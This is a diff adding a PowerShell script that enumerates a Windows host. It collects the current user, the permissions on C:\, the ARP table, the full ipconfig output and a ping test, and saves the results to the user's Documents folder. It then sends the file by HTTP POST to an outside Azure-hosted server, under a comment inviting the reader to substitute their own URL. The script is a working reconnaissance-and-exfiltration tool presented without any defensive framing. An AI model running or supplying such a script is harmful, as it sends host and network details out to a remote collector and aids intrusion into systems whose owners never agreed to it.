@@ -1,0 +1,44 @@
+# Enumerate current user and permissions
+$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
+$acl = (Get-Acl "C:\").GetAccessRules($true, $true, [System.Security.Principal.NTAccount])
+$permissions = $acl | ForEach-Object { $_.IdentityReference.Value + ": " + $_.AccessControlType + " " + $_.FileSystemRights }
+
+# Run arp
+$arpResult = arp -a
+
+# Run ipconfig
+$ipConfigResult = ipconfig /all
+
+# Ping 8.8.8.8
+$pingResult = Test-Connection -ComputerName 8.8.8.8
+
+# Create a path for the output file in the user's Documents folder
+$outputPath = [System.IO.Path]::Combine(
+    [Environment]::GetFolderPath("MyDocuments"),
+    "EnumerationOutput.txt"
+)
+
+# Combine all the collected data into a single output
+$outputData = @"
+Current User: $($currentUser.ToString())
+Permissions: $permissions
+
+ARP Result:
+$arpResult
+
+IPConfig Result:
+$ipConfigResult
+
+Ping Result:
+$pingResult
+"@
+
+# Write the output to the file
+$outputData | Out-File -FilePath $outputPath -Force
+
+# Read the content of the output file
+$winIniContent = Get-Content $outputPath
+
+# Send the content using POST request
+$webServerUrl = "http://dierotmannschaft.westus.cloudapp.azure.com/web/post"  # Replace with your actual URL
+Invoke-RestMethod -Uri $webServerUrl -Method Post -Body $winIniContent
